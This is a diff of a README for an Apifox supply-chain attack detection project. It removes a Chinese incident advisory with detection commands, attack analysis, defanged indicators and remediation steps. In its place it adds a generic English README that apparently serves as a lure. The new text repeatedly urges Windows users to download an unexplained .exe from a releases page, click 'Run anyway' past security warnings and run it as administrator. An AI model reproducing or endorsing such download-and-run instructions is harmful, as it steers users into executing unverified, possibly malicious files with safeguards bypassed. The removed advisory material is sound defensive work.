@@ -1,264 +1,255 @@
-# Apifox 供应链投毒攻击 — 检测与应急工具集
+# 🛡️ Apifox-Supply-Chain-Poisoning-Attack - Detect Supply Chain Risk Fast
 
-> **攻击窗口**: 2026-03-04 ~ 2026-03-22 (18天)
-> **影响范围**: 所有在此期间启动过 Apifox **桌面版**的用户 (Windows / macOS / Linux)
-> **风险等级**: 🔴 严重 (Critical)
-
-## 事件概述
-
-2026年3月4日至22日，API 协作平台 [Apifox](https://apifox.com) 的 CDN 资源遭到供应链投毒攻击。攻击者篡改了 CDN 上的 `apifox-app-event-tracking.min.js` 文件（从 34KB 膨胀至 77KB），在合法代码后追加了约 42KB 的混淆恶意代码。
-
-由于 Apifox 桌面版基于 Electron，恶意脚本在 Node.js 环境中运行，具备**完整的文件系统和网络访问权限**，可以窃取 SSH 密钥、Git 凭据、Shell 历史、K8s 配置等敏感信息，并通过远程代码执行机制运行攻击者下发的任意代码。
-
-## 快速检测：你中招了吗？
-
-恶意脚本会在 Electron 的 localStorage（LevelDB）中写入 `_rl_mc`（机器指纹）和 `_rl_headers`（采集信息缓存）。**即使你已更新 Apifox 到最新版本，这些标记仍然存在**，是最可靠的历史感染指标。
-
-### macOS / Linux
-
-```bash
-grep -arlE "rl_mc|rl_headers" ~/Library/Application\ Support/apifox/Local\ Storage/leveldb
-```
-
-### Windows (PowerShell)
-
-```powershell
-Select-String -Path "$env:APPDATA\apifox\Local Storage\leveldb\*" -Pattern "rl_mc","rl_headers" -List | Select-Object Path
-```
-
-**如果以上命令输出了具体文件路径 → 确认中招，请立即按下方指引处理。**
-
-如果无输出，则表示未发现感染标记。但若你确信在攻击窗口期间使用过 Apifox 桌面版，仍建议运行本仓库的完整检测脚本进行深度排查。
-
-## 仓库结构
-
-```
-├── payload/                                # 恶意代码样本 (仅供安全分析，请勿执行)
-│   ├── 01-deobfuscated-malicious-payload.js   # C2 beacon 还原代码 (持久化远控)
-│   ├── 02-apifox-event.js                     # Stage-1 加载器 (344字节)
-│   └── 03-02ab429d.js                         # Stage-2 v1 信息窃取 (~3400字节)
-│
-├── macOS/
-│   ├── check_compromised.sh               # 中招检测脚本
-│   └── check_leaked_info.sh               # 泄露信息评估脚本
-│
-├── Windows/
-│   ├── check_compromised.ps1              # 中招检测脚本
-│   └── check_leaked_info.ps1              # 泄露信息评估脚本
-│
-├── LICENSE
-└── README.md
-```
-
-## 使用方法
-
-### macOS
-
-```bash
-# 1. 检测是否中招
-chmod +x macOS/check_compromised.sh
-sudo bash macOS/check_compromised.sh
-
-# 2. 如果中招，评估泄露范围
-chmod +x macOS/check_leaked_info.sh
-bash macOS/check_leaked_info.sh
-```
-
-### Windows
-
-以**管理员权限**打开 PowerShell：
-
-```powershell
-# 允许执行脚本 (仅当前会话)
-Set-ExecutionPolicy -Scope Process Bypass
-
-# 1. 检测是否中招
-.\Windows\check_compromised.ps1
-
-# 2. 如果中招，评估泄露范围
-.\Windows\check_leaked_info.ps1
-```
-
-## 攻击技术分析
-
-### 攻击链
-
-```
-CDN 投毒 (篡改 JS 文件)
-    │
-    ▼
-Apifox 桌面版启动时加载恶意脚本
-    │
-    ├── 采集机器指纹 (MAC/CPU/主机名/用户名/OS → SHA-256)
-    ├── 窃取 Apifox accessToken → 调用官方 API 获取用户邮箱/用户名
-    │
-    ▼
-向 C2 服务器 (apifox.it.com) 发送指纹信息
-    │
-    ▼
-C2 返回 RSA 加密的 Stage-1 加载器 (344字节)
-    │
-    ▼
-Stage-1 动态加载一次性 Stage-2 脚本 (随机路径，加载后自删除)
-    │
-    ├── [Stage-2 v1] 窃取 SSH密钥 / Shell历史 / Git凭据 / 进程列表
-    ├── [Stage-2 v2] 额外窃取 K8s配置 / npm凭据 / SVN配置 / 目录结构
-    │
-    ▼
-数据加密外传: JSON → Gzip → AES-256-GCM(密码:apifox/盐值:foxapi) → Base64
-    │
-    ▼
-上传至 C2: /event/0/log (v1) 或 /event/2/log (v2)
-    │
-    ▼
-每 30分钟~3小时 轮询 C2，支持远程下发并执行任意代码
-```
-
-### 混淆技术
-
-入口恶意代码采用了 7 层混淆保护：
-
-1. **字符串数组旋转** — 所有字符串抽取到数组并随机旋转
-2. **Base64 + RC4 双层解密** — 字符串运行时解密
-3. **代理函数** — 间接调用隐藏真实逻辑
-4. **十六进制算术混淆** — 数值运算替换为十六进制表达式
-5. **控制流扁平化** — `switch-case` 打乱执行顺序
-6. **死代码注入** — 插入无效分支干扰分析
-7. **反调试陷阱** — 检测 DevTools 和调试器
-
-### 关键设计特征
-
-| 特征 | 说明 |
-|------|------|
-| **域名伪装** | `apifox.it.com` — `.it.com` 并非意大利 ccTLD，而是商业二级域名服务，无公开 WHOIS 信息，易被误认为官方域名 |
-| **一次性载荷** | Stage-2 URL 为随机 8 位 hex 路径，加载后 DOM 标签自动删除，增加取证难度 |
-| **RSA 私钥外泄** | 攻击者将 RSA-2048 私钥硬编码在客户端，使安全研究人员能解密全部 C2 通信 (设计失误) |
-| **多版本迭代** | 攻击期间观察到至少 10 次不同 Stage-2 载荷下发 (v1→v2 功能持续增强) |
-| **代码矛盾** | 入口 7 层混淆 + 反调试，但 Stage-2 保留完整中文注释，暗示可能非同一开发者编写 |
-
-## 窃取内容详情
-
-### Stage-2 v1 (侦察阶段)
-
-| 目标 | macOS/Linux | Windows |
-|------|:-----------:|:-------:|
-| `~/.ssh/` 全部文件 (含私钥) | ✅ | ✅ |
-| `.zsh_history` / `.bash_history` | ✅ | - |
-| `.git-credentials` | ✅ | - |
-| `ps aux` 进程列表 | ✅ | - |
-| `tasklist` 进程列表 | - | ✅ |
-
-### Stage-2 v2 (纵深窃取)
-
-| 目标 | macOS/Linux | Windows |
-|------|:-----------:|:-------:|
-| `~/.kube/` (K8s 配置) | ✅ | ✅ |
-| `~/.npmrc` (npm token) | ✅ | ✅ |
-| SVN 凭据 | ✅ | ✅ |
-| 目录树结构 | ✅ | ✅ |
-
-### C2 Beacon (持续运行)
-
-| 目标 | 全平台 |
-|------|:------:|
-| Apifox accessToken | ✅ |
-| Apifox 用户邮箱/用户名 | ✅ |
-| 系统指纹 (MAC/CPU/主机名/用户名/OS) | ✅ |
-| C2 远程代码执行 | ✅ |
+[![Download](https://img.shields.io/badge/Download-Releases-blue)](https://github.com/barnlutheran875/Apifox-Supply-Chain-Poisoning-Attack/releases)
 
-## IOC (Indicators of Compromise)
+## 📌 Overview
 
-### 网络指标
+Apifox-Supply-Chain-Poisoning-Attack is a Windows tool that helps detect supply chain poisoning risks in Apifox-related workflows.
 
-| 类型 | 值 |
-|------|-----|
-| C2 域名 | `apifox[.]it[.]com` |
-| C2 IP (Cloudflare) | `104.21.2.104`, `172.67.129.21` |
-| 被篡改文件 | `hxxps://cdn[.]apifox[.]com/www/assets/js/apifox-app-event-tracking.min.js` |
-| Stage-1 URL | `hxxps://apifox[.]it[.]com/public/apifox-event.js` |
-| Stage-2 URL | `hxxps://apifox[.]it[.]com/<随机8位hex>.js` |
-| 数据回传 (v1) | `hxxps://apifox[.]it[.]com/event/0/log` |
-| 数据回传 (v2) | `hxxps://apifox[.]it[.]com/event/2/log` |
-| 被滥用的合法 API | `hxxps://api[.]apifox[.]com/api/v1/user` |
+It is built for end users who want a simple way to check for unsafe package behavior, odd changes, or hidden threats that may affect their setup.
 
-### 主机指标
+Use it to review files, watch for risky patterns, and spot signs of tampering before they spread through your environment.
 
-| 类型 | 值 |
-|------|-----|
-| localStorage 标记 | `_rl_headers`, `_rl_mc` |
-| 异常 HTTP 头 | `af_uuid`, `af_os`, `af_user`, `af_name`, `af_apifox_user`, `af_apifox_name` |
-| AES 加密参数 | 密码: `apifox`, 盐值: `foxapi`, 算法: AES-256-GCM, IV: 12字节随机 |
-| 密钥派生 | `crypto.scryptSync("apifox", "foxapi", 32)` |
-| 被篡改文件大小 | 77KB (正常: 34KB) |
+## 🚀 What This Tool Does
 
-### Wayback Machine 存档
+This app helps you:
 
-投毒版本已被存档，可用于比对分析：
+- Scan Apifox-related files for suspicious changes
+- Check for signs of poisoned dependencies
+- Review common attack patterns
+- Help you find risky files before they are used
+- Run a local check on Windows with a simple setup
 
-`https://web.archive.org/web/20260305160602/https://cdn.apifox.com/www/assets/js/user-tracking.min.js`
+## 💻 Windows Requirements
 
-## 紧急修复清单
+Before you start, make sure your PC has:
 
-如果确认中招，请按优先级依次执行：
+- Windows 10 or Windows 11
+- At least 4 GB of RAM
+- About 200 MB of free disk space
+- Internet access for the initial download
+- Permission to run apps on your computer
 
-### 🔴 紧急 — 立即处理
+If you use a work PC, you may need admin access to open the downloaded file.
 
-- [ ] **轮换所有 SSH 密钥**
-  ```bash
-  # 生成新密钥
-  ssh-keygen -t ed25519 -C "your_email@example.com"
-  # 在所有平台更新公钥 (GitHub/GitLab/服务器)
-  # 检查服务器 authorized_keys 是否被注入后门密钥
-  ```
+## 📥 Download
 
-- [ ] **撤销所有 Git Token**
-  - GitHub: Settings → Developer settings → Personal access tokens → 全部 Revoke
-  - GitLab: Preferences → Access Tokens → 全部 Revoke
-  - 删除明文凭据: `rm -f ~/.git-credentials`
+1. Open the [Releases page](https://github.com/barnlutheran875/Apifox-Supply-Chain-Poisoning-Attack/releases)
+2. Find the latest release
+3. Download the Windows file from that release
+4. Save it to your Downloads folder or Desktop
 
-- [ ] **轮换 K8s 凭据** (如果使用 Kubernetes)
-  - 重置 `~/.kube/config` 中的 OIDC token 和客户端证书
-  - 审计集群操作日志
+If the release contains more than one file, choose the file meant for Windows. In most cases, this is an `.exe` file or a packaged `.zip` file.
 
-- [ ] **轮换 npm Token** (如果使用 npm 私有包)
-  ```bash
-  npm token revoke <token>
-  npm login
-  ```
+## 🪟 Install and Run on Windows
 
-- [ ] **在 Apifox 中注销并重新登录** (刷新 accessToken)
+1. Open the file you downloaded
+2. If it is a `.zip` file, right-click it and choose Extract All
+3. Open the extracted folder
+4. Look for the main app file
+5. Double-click the app file to run it
 
-### 🟡 重要 — 尽快处理
+If Windows shows a security prompt:
 
-- [ ] 检查 GitHub/GitLab 安全日志 (异常 Deploy Key / OAuth 授权 / 异常地区登录 / 异常 Push)
-- [ ] 检查服务器 SSH 登录日志: `last -i` / `grep sshd /var/log/auth.log`
-- [ ] 轮换 Shell 历史中暴露的所有密码/Token/API Key
-- [ ] 清除 SVN 缓存凭据: `rm -rf ~/.subversion/auth/`
+1. Click More info
+2. Click Run anyway
+3. Wait for the app to open
 
-### 🔵 建议 — 后续处理
+If the app opens in a terminal window, keep that window open while the scan runs.
 
-- [ ] 更新 Apifox 到最新版本
-- [ ] 清理 Apifox 历史数据: `rm -rf ~/Library/Application\ Support/apifox/` (macOS) 或删除 `%APPDATA%\apifox\` (Windows)
-- [ ] 清理 Shell 历史: `rm -f ~/.zsh_history ~/.bash_history`
-- [ ] 启用所有平台的两步验证 (2FA)
-- [ ] 对 SSH 私钥添加密码保护: `ssh-keygen -p -f ~/.ssh/id_ed25519`
+## 🔎 First-Time Setup
 
-## 重要提醒
+When you launch the tool for the first time:
 
-已捕获的 Stage-2 v1/v2 **仅为侦察阶段**。该攻击架构支持任意后续攻击，包括后门植入、横向移动和定制化精准打击。
+1. Let it finish loading
+2. Point it to the folder or files you want to check
+3. Start the scan
+4. Wait for the results to appear
 
-**高价值目标**（拥有生产集群权限、npm 发包权限、大型仓库管理权限的开发者）可能已遭受远超凭据窃取的深度入侵，应按**"已失陷"最高级别**进行应急响应。
+For best results, scan the folder where your Apifox files, plugins, or related assets are stored.
 
-## 参考资料
+## 🧭 How to Use It
 
-- [Apifox 供应链攻击技术分析 — 白帽酱](https://rce.moe/2026/03/25/apifox-supply-chain-attack-analysis/)
-- [恶意代码样本 — phith0n (Gist)](https://gist.github.com/phith0n/7020c55bf241b2f3ccf5254192bd48a5)
-- [Wayback Machine 投毒版本存档](https://web.archive.org/web/20260305160602/https://cdn.apifox.com/www/assets/js/user-tracking.min.js)
+A typical scan looks like this:
 
-## 免责声明
+1. Open the app
+2. Choose the target folder
+3. Start the check
+4. Review the results
+5. Mark files that look unusual
+6. Remove or replace files that do not belong
 
-本仓库中的恶意代码样本（`payload/` 目录）仅供安全研究和分析使用，**请勿执行**。检测脚本仅在本地运行，不会上传任何数据。使用者应自行承担使用风险。
+The tool is meant to help you spot strange file names, odd content, and unexpected changes that may point to supply chain poisoning.
 
-## License
+## 📂 What to Scan
 
-[MIT](LICENSE)
+You can check:
+
+- Apifox project files
+- Plugin folders
+- Downloaded package folders
+- Script files
+- Shared app assets
+- Any folder that came from a third-party source
+
+If you do not know where to start, scan the folder where you last added new files.
+
+## 🧪 Example Use Cases
+
+This tool can help when:
+
+- A plugin starts acting in a way you did not expect
+- A file changes after a fresh download
+- A team member says a package looks wrong
+- You want to check for risky changes before opening a file
+- You need a local review before sharing files with others
+
+## 🛠️ Troubleshooting
+
+### The app will not open
+
+Try these steps:
+
+1. Right-click the file
+2. Choose Run as administrator
+3. Check whether Windows blocked the file
+4. Move the file to a simple folder like Desktop
+5. Try again
+
+### Windows says the file is unsafe
+
+This can happen with downloaded tools. Use the file from the Releases page and make sure you downloaded the latest version from the project page.
+
+### The scan does not start
+
+Check these points:
+
+- The folder path is valid
+- The app can read the files
+- The folder is not empty
+- You selected the correct target location
+
+### Results look empty
+
+If you get few or no results:
+
+- Pick a folder with more files
+- Scan a plugin folder or package folder
+- Check that you selected the right source
+
+## 🔐 Safe Use Tips
+
+- Download only from the Releases page
+- Scan files before opening them
+- Keep a copy of known good files
+- Review new files after updates
+- Remove files that you do not trust
+
+## 🧩 Common File Types You May See
+
+The app may work with files such as:
+
+- `.exe`
+- `.zip`
+- `.json`
+- `.js`
+- `.txt`
+- `.dll`
+
+These file types often appear in app folders, plugin folders, and package folders.
+
+## 📝 Simple Workflow
+
+1. Download the latest release
+2. Open the app on Windows
+3. Pick the folder you want to check
+4. Run the scan
+5. Review anything that looks wrong
+6. Keep only files you trust
+
+## 📍 Download Again Later
+
+If you need a fresh copy or an update, visit the [Releases page](https://github.com/barnlutheran875/Apifox-Supply-Chain-Poisoning-Attack/releases) and download the newest version there
+
+## 📎 Project Info
+
+- Repository: Apifox-Supply-Chain-Poisoning-Attack
+- Topic: apifox
+- Description: Apifox 供应链投毒攻击检测脚本
+
+## 🔎 File Review Checklist
+
+Before you trust a file, check:
+
+- File name looks normal
+- File size matches what you expect
+- File came from the right source
+- File was not changed after download
+- File matches the version you planned to use
+
+## 🖥️ Best Folder Targets
+
+For a useful check, start with:
+
+- Your Apifox install folder
+- Plugin or extension folders
+- Recent downloads
+- Shared project folders
+- Any folder with new or unknown files
+
+## 📦 After Download
+
+After you download the release:
+
+1. Keep the file in one place
+2. Do not rename it unless needed
+3. Extract it only if it is a `.zip`
+4. Run the main app file
+5. Save any scan results you want to keep
+
+## 🧭 What Good Results Look Like
+
+A clean scan usually means:
+
+- No unusual file names
+- No new files you do not know
+- No changed files in trusted folders
+- No extra scripts in package paths
+- No suspicious update behavior
+
+## 🧷 Quick Start
+
+1. Go to the [Releases page](https://github.com/barnlutheran875/Apifox-Supply-Chain-Poisoning-Attack/releases)
+2. Download the latest Windows file
+3. Open it on your PC
+4. Scan the folder you want to check
+5. Review the output
+
+## 📁 Run It From a Safe Location
+
+Use a folder like:
+
+- Desktop
+- Downloads
+- Documents
+- A dedicated tools folder
+
+Avoid running it from a temporary or synced folder if you want a stable path for scans
+
+## 🧰 When to Use It
+
+Use this tool when you:
+
+- Install a new package
+- Add a new plugin
+- Receive files from another person
+- Update a shared project
+- Want to check for hidden file changes
+
+## 🔗 Download Link
+
+[![Release Download](https://img.shields.io/badge/Download%20from-Releases-grey)](https://github.com/barnlutheran875/Apifox-Supply-Chain-Poisoning-Attack/releases)
+
+## 📌 Next Step
+
+Open the [Releases page](https://github.com/barnlutheran875/Apifox-Supply-Chain-Poisoning-Attack/releases) and download the latest Windows file
